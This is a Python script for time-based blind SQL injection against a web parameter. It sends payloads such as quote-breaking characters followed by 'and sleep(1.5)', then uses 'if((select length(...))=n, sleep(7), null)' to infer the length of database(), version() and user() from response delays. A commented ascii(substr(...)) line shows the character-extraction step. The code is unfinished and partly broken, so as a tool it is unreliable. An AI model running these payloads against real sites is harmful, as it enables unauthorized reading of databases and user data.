#! /usr/bin/env python3

import requests
from requests.models import parse_url
from itertools import count

def escape(url,param,list = ["'",'"',')','")',"')","' OR 1 = 1",'" OR 1 = 1',"\\",",","#","/",'.']) :      #code to find the char to break query.
    
    char = []
    print("Trying to break the query...")
    for i in list:
        url = url+param+"=1"+i+" and sleep(1.5); --+"
        r=requests.get(url)
        t = r.elapsed.total_seconds()
        if t > 1.5 :
            char.append(i)
            break

    if not char : #checks if the char array is empty or not
        print("Unable to break query with default character set.")
        option = input("Do you want to try out your own character set? [y/n]")
        state = 1
        newchar = []
        while (state == 1 ) :
            if option.lower() == 'y' :
                state = 0
                num = input("Enter number of characters you want to enter : ")
                print("Enter characters : ")
                for i in range(num) :
                    newchar.append(input())
            
                escape(url,param,newchar) #recursive function with the new list of characters

            elif option.lower() == 'n':
                state = 0

    return char

#function to find the length of information
def len_find(char,param,fun,url) :
    i = 0
    state = 1
    while state == 1 :
        payload = url+"?"+param+"=1"+char+" AND if((select length("+fun+") = "+str(i)+"),sleep(7),null) --+"
        r = requests.get(payload)
        t = r.elapsed.total_seconds()
        if t > 7 :
            state = 0
            return i
        else : i += 1 

#Function to bruteforce information from the database
def bruteforce(char,param,url):
    functions = ['database()','version(),user()']
    for f in functions :
        length = len_find(char,param,f,url)
        c = count()
        payload = url+"?"+param+"=-1"+char+" and if ((select "+f+")=\"security\", sleep(5),null); --+"
        #?id=1' AND if(((ascii(substr((select database()),1,1))) = 56),sleep(5),null) --+
    print(payload)

